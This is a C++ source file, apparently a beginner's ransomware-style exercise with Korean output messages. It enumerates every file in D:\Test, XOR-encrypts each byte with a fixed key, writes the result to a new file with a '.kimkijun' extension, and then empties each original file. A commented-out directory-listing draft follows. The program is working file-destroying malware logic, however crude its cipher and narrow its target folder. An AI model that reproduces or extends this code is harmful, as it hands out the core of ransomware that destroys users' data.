#include <iostream>
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <fcntl.h>
#include <io.h>
#include <string>
#include <list>
#include <algorithm>

using namespace std;

class File
{
private:
	string CName;
	int i;
	FILE* OpenFile = nullptr;
	FILE* WriteFile = nullptr;

public:
	File()
	{
		cout << "start" << endl;
	}

	string setpath(string a)
	{
		string b = "D:\\Test\\";
		b += a;
		return b;
	}

	list<string> dirList()
	{
		list<string>  list1;
		list<string>::iterator itor;
		itor = list1.begin();

		string path = "D:\\Test\\*.*";

		struct _finddata_t fd;

		intptr_t handle;

		if ((handle = _findfirst(path.c_str(), &fd)) == -1L)

			cout << "No file in directory!" << endl;

		while (_findnext(handle, &fd) == 0)
		{
			list1.push_back(setpath(fd.name));
		}

		_findclose(handle);

		return list1;
	}

	void in(list<string> TargetList)
	{
		for (list<string>::iterator itor = TargetList.begin(); itor != TargetList.end(); itor++)
		{
			OpenFile = fopen(itor->c_str(), "rb");

			cout << "암호화 할 파일명" << itor->c_str() << endl;

			if (OpenFile == nullptr)
			{
				cout << "파일이 존재하지 않습니다." << endl;
			}
			else
			{
				CName = *itor + ".kimkijun";
				cout << "암호화된 파일명 : " << CName << endl;
				WriteFile = fopen(CName.c_str(), "w+b");

				while ((i = fgetc(OpenFile)) != EOF)
				{
					i ^= 69;
					fputc(i, WriteFile);
				}

				fclose(OpenFile);

				FILE * initialStream = fopen(itor->c_str(), "w+");
				fclose(initialStream);

				fclose(WriteFile);
			}
		}
	}

};


int main(void)
{
	File a;
	a.in(a.dirList());
	return 0;
}

//#include <iostream>
//#include <Windows.h>
//#include <io.h>
//#include <string>
//#include <list>
//#include <algorithm>
//
//using namespace std;	
//
//void p(string a)
//{
//	string b = "D:\\Test\\";
//	b += a;
//	cout << b << endl;
//}
//
//int main()
//{
//	list<string>  list1;
//	list<string>::iterator itor;
//	itor = list1.begin();
//
//	string path = "D:\\Test\\*.*";
//
//	struct _finddata_t fd;
//
//	intptr_t handle;
//
//	if ((handle = _findfirst(path.c_str(), &fd)) == -1L)
//
//		cout << "No file in directory!" << endl;
//
//	while (_findnext(handle, &fd) == 0)
//	{
//		list1.push_back(fd.name);
//	}
//
//	_findclose(handle);	
//	
//	for (itor = list1.begin(); itor != list1.end(); itor++)
//	{
//		p(*itor);
//	}
//}